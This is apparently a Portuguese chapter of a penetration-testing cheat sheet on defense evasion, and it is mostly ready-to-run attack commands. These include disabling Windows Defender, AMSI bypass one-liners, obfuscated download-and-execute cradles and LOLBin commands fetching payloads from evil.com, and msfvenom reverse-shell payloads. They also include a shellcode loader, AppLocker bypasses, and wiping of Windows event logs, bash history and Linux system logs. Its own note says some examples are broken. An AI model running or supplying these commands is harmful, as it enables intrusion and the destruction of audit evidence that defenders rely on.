# 🛡️ Fase 6: Evasão de defesas

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](06-Defense-Evasion.tr.md) • [🇬🇷 Ελληνικά](06-Defense-Evasion.el.md)

```
  ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗███████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗█████╗  
  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
  ██████╔╝███████╗██║     ███████╗██║ ╚████║███████║███████╗
  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
        ███████╗██╗   ██╗ █████╗ ███████╗██╗ ██████╗ ███╗   ██╗
        ██╔════╝██║   ██║██╔══██╗██╔════╝██║██╔═══██╗████╗  ██║
        █████╗  ██║   ██║███████║███████╗██║██║   ██║██╔██╗ ██║
        ██╔══╝  ╚██╗ ██╔╝██╔══██║╚════██║██║██║   ██║██║╚██╗██║
        ███████╗ ╚████╔╝ ██║  ██║███████║██║╚██████╔╝██║ ╚████║
        ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

**Objetivo:** Contornar controlos de segurança (AV, EDR, AMSI e firewalls) para evitar a deteção.

> **Notas sobre a precisão do original:** AV significa antivírus; EDR, deteção e resposta em endpoints; AMSI, interface de análise antimalware; ETW, rastreio de eventos do Windows. Os exemplos são dependentes da versão e da configuração e não garantem evasão. A secção “Desativar o rastreio de eventos” apenas declara uma função com `Add-Type`: não altera a sua memória nem desativa o ETW. A cadeia de formatação `{0telekinetic1}{2}i{3}` no exemplo AMSI contém índices incompatíveis com os argumentos fornecidos. O carregador C apresenta shellcode abreviado e omite cabeçalhos e verificações. Os comandos de preferências do Defender não representam todas as suas funcionalidades.

---

## 🛡️ Evasão do Windows Defender

### Desativar o Windows Defender (requer administrador)
```powershell
# Desativar a monitorização em tempo real
Set-MpPreference -DisableRealtimeMonitoring $true

# Desativar todas as funcionalidades do Defender
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# Adicionar caminhos de exclusão
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# Através do registo
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

### Verificar o estado do Defender
```powershell
Get-MpComputerStatus
Get-MpPreference
```

---

## 🔓 Contornar a AMSI

### Contornar a AMSI em PowerShell
```powershell
# Método 1 — amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Método 2 — comando de uma linha de Matt Graeber
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

# Método 3 — alteração da memória
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Contornar a AMSI com ofuscação
```powershell
# Ofuscação de cadeias de caracteres
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0telekinetic1}{2}i{3}' -f $a,$b,$u))
$field = $assembly.GetField(('a]ot>m]ot>siInitFailed' -replace ']ot>',''),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

## 📦 Ofuscação de payloads

### Ofuscação de PowerShell
```powershell
# Codificação Base64
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# Concatenação de cadeias de caracteres
$a = 'Down'; $b = 'loadString'
(New-Object Net.WebClient)."$a$b"('http://evil.com/payload.ps1') | IEX

# Invoke-Obfuscation
Invoke-Obfuscation -ScriptPath payload.ps1 -Command 'TOKEN\ALL\1' -Quiet
```

### Ofuscação de binários
```bash
# Codificação com msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe > payload.exe

# XOR personalizado
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw | python3 xor_encrypt.py > payload.bin

# Shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

### Carregadores de shellcode
```c
// Carregador de shellcode simples em C
unsigned char shellcode[] = "\xfc\x48\x83...";

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

---

## 🎭 Living off the land (LOLBins: utilização de binários legítimos do sistema)

### Descarregar e executar
```cmd
# certutil
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
certutil -decode encoded.txt payload.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe

# curl (Windows 10+)
curl http://evil.com/payload.exe -o C:\temp\payload.exe

# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\temp\payload.exe')"
Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\temp\payload.exe
```

### Executar payloads
```cmd
# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(payload)")

# mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(payload)"", 0:close")
mshta http://evil.com/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll

# wmic
wmic process call create "powershell -ep bypass -c IEX(payload)"

# msiexec
msiexec /q /i http://evil.com/payload.msi
```

### Contornar o AppLocker/WDAC
```cmd
# installutil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# msbuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

---

## 🔒 Contornar o ETW e o registo de eventos

### Desativar o rastreio de eventos
```powershell
# Alterar o ETW em memória
$patch = @"
using System;
using System.Runtime.InteropServices;
public class Etw {
    [DllImport("ntdll.dll")]
    public static extern int EtwEventWrite(long x, long y, long z, long q);
}
"@
Add-Type $patch
```

### Limpar registos de eventos
```powershell
# Limpar todos os registos
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# Ou desativar o registo de eventos
auditpol /clear /y
```

### Desativar o registo de eventos do PowerShell
```powershell
# Desativar o registo de blocos de script
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Desativar o registo de módulos
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

---

## 🐧 Evasão em Linux

### Timestomping (alteração de marcas temporais)
```bash
# Alterar as marcas temporais do ficheiro
touch -r /etc/passwd malicious.sh
touch -d "2020-01-01 12:00:00" malicious.sh
```

### Limpar registos
```bash
# Limpar o histórico do bash
history -c
cat /dev/null > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# Limpar os registos do sistema
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
echo > /var/log/messages
```

### Ocultação de processos
```bash
# Ocultar o nome do processo
exec -a "[kworker/0:0]" ./malicious

# Ocultação com LD_PRELOAD
# Compilar uma biblioteca que intercepte readdir() para ocultar processos
```

---

## 🛠️ Ferramentas

| Ferramenta | Finalidade |
|------|---------|
| **Invoke-Obfuscation** | Ofuscação de PowerShell |
| **Veil** | Geração de payloads |
| **ScareCrow** | Gerador de payloads para contornar EDR |
| **Donut** | Gerador de shellcode |
| **Nimcrypt2** | Empacotador de PE |
| **PEzor** | Carregador de shellcode PE |

---

## 📊 Referência rápida

### Métodos de deteção e técnicas para os contornar

| Deteção | Técnica para contornar |
|-----------|------------------|
| Baseada em assinaturas | Ofuscação, codificação |
| AMSI | Alteração da memória, scripts para contornar a proteção |
| ETW | Alteração do ETW em memória |
| Registo de eventos | Desativar o registo de eventos, limpar registos |
| AppLocker | LOLBins, caminhos para contornar as políticas |
| Comportamento | Utilização de ferramentas legítimas do sistema |

### Lista rápida de LOLBins

| Binário | Utilização |
|--------|-----|
| certutil | Descarregar ficheiros |
| bitsadmin | Descarregar ficheiros |
| mshta | Executar HTA |
| rundll32 | Executar DLL/JS |
| regsvr32 | Executar SCT |
| msbuild | Executar XML |
| installutil | Executar EXE |

---

## 🔗 Guias de referência relacionados

- [PowerShell](../../PowerShell/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**Fase anterior:** [← 05 - Persistência](./05-Persistence.pt.md)

**Fase seguinte:** [07 - Ações sobre os objetivos →](./07-Actions-Objectives.pt.md)
